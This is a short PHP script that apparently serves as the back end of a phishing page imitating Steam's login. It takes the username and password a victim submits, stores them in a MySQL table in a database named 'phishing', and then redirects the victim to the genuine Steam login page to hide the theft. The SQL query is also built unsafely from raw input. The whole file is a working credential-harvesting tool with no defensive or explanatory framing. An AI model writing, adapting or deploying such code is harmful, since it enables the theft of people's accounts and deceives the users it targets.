<?php
$server = "localhost";
$username = "root";
$password = "";
$dbname = "phishing";

$con = mysqli_connect($server, $username, $password, $dbname);

if (!$con) {
    echo "Connection failed";
}

$name = $_POST['username'];
$pass = $_POST['password'];

$sql = "INSERT INTO `steam`(`username`, `password`) VALUES ('$name','$pass')";
$result = mysqli_query($con, $sql);
if ($result) {
    header('Location: https://store.steampowered.com/login/?redir=&redir_ssl=1&snr=1_4_660__global-header');
} else {
    echo "Data not inserted";
}
